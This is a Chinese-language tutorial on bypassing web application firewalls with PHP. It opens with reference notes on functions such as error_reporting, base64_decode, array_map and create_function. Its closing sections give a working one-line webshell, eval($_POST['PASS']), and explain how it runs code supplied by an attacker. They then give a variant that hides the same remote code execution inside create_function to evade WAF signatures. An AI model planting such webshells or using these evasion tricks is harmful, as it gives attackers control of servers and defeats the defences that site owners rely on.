# PHP绕过WAF检测

## 常用函数

### error_reporting()

```
error_reporting(report_level)
```

| 值   | 常量                | 描述                                                         |
| :--- | :------------------ | :----------------------------------------------------------- |
| 1    | E_ERROR             | 致命的运行时错误。 错误无法恢复过来。脚本的执行被暂停        |
| 2    | E_WARNING           | 非致命的运行时错误。 脚本的执行不会停止                      |
| 4    | E_PARSE             | 编译时解析错误。解析错误应该只由分析器生成                   |
| 8    | E_NOTICE            | 运行时间的通知                                               |
| 16   | E_CORE_ERROR        | 在PHP启动时的致命错误。这就好比一个在PHP核心的E_ERROR        |
| 32   | E_CORE_WARNING      | 在PHP启动时的非致命的错误。这就好比一个在PHP核心E_WARNING警告 |
| 64   | E_COMPILE_ERROR     | 致命的编译时错误。 这就像由Zend脚本引擎生成了一个E_ERROR     |
| 128  | E_COMPILE_WARNING   | 非致命的编译时错误，由Zend脚本引擎生成了一个E_WARNING警告    |
| 256  | E_USER_ERROR        | 致命的用户生成的错误                                         |
| 512  | E_USER_WARNING      | 非致命的用户生成的警告                                       |
| 1024 | E_USER_NOTICE       | 用户生成的通知                                               |
| 2048 | E_STRICT            | 运行时间的通知                                               |
| 4096 | E_RECOVERABLE_ERROR | 捕捉致命的错误                                               |
| 8191 | E_ALL               | 所有的错误和警告                                             |

**Example:**

```php
<?php
//禁用错误报告
error_reporting(0);

//报告运行时错误
error_reporting(E_ERROR | E_WARNING | E_PARSE);

//报告所有错误
error_reporting(E_ALL);
?>
```

### base64_decode()

base64_decode — 对使用 MIME base64 编码的数据进行解码

```
base64_decode ( string $data , bool $strict = false ) : string
```

**参数解释**
|参数|说明|
|---|---|
|data|编码过的数据|
|strict|当设置 `strict` 为 **`true`** 时，一旦输入的数据超出了 base64 字母表，将返回 **`false`**。 否则会静默丢弃无效的字符。|

返回原始数据， 或者在失败时返回 **`false`**。返回的数据可能是二进制的

**Example**

```php
<?php
$str = 'VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==';
echo base64_decode($str);
?>
```

### array_map()

array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组。

**语法**

```php
array_map(*myfunction,array1,array2,array3*...)
```


| 参数         | 描述                                      |
| :----------- | :---------------------------------------- |
| *myfunction* | 必需。用户自定义函数的名称，或者是 null。 |
| *array1*     | 必需。规定数组。                          |
| *array2*     | 可选。规定数组。                          |
| *array3*     | 可选。规定数组。                          |

**Example**

```php
<?php
function myfunction($v)
{
if ($v==="Dog")
   {
   return "Fido";
   }
return $v;
}

$a=array("Horse","Dog","Cat");
print_r(array_map("myfunction",$a));
?>
```

### creat_function()

创建一个匿名函数，此函数在内部执行`eval`，因此有相同的安全性问题。此外，它还具有不良的性能和内存使用特性

```php
create_function （字符串 $args ，字符串 $code ）：字符串
```

通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，如果使用双引号，则需要转义变量名，例如`\$avar`。

- `args`

  函数参数。

- `code`

  功能代码。

返回唯一的函数名称作为字符串或**`false`**错误。

**Example**

```php
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo "New anonymous function: $newfunc\n";
echo $newfunc(2, M_E) . "\n";
// outputs
// New anonymous function: lambda_1
// ln(2) + ln(2.718281828459) = 1.6931471805599
?>
```

### var_dump()

var_dump — 打印变量的相关信息

```php
var_dump ( mixed $expression , mixed $... = ? ) : void
```

**Example**

```php
<?php
$a = array(1, 2, array("a", "b", "c"));
var_dump($a);
?>
```

## PHP WEBSHELL工作原理

```php
<?php
    eval($_POST["PASS"]);
?>
```

当PASS == phpinfo();时

```php
<?php
    eval("phpinfo();")
?>
```

所以执行`phpinfo()`

如果pass值为`echo dirname(__FILE__)`

则会输出文件所在目录 

## 绕过WAF

### 使用create_function()替换eval()

**Example**

```php
<?php
    $pass = $_POST['pass'];
    $a = create_function("",$pass);
	$a();
?>
```

